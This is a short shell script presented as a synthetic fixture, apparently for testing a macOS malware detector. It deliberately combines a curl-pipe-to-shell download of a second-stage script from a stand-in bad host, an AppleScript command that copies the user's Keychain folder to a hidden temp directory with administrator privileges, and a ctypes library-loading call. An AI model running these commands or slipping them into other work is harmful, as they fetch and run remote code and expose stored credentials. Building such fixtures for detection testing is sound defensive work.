#!/bin/sh
# Synthetic suspicious fixture: curl-pipe-to-shell combined with an
# AppleScript-driven privilege escalation attempt and a Keychain reference.
# Stacks multiple weak signal families deliberately, so it should clear the
# "requires signal-family combination" bar in design doc §5.1, not just a
# single generic flag.
curl -fsSL https://example-bad.test/stage2.sh | sh

osascript -e 'do shell script "cp -R ~/Library/Keychains /tmp/.cache" with administrator privileges'

python3 - <<'EOF'
import ctypes
ctypes.CDLL(None).dlopen(b"/usr/lib/libSystem.dylib", 2)
EOF
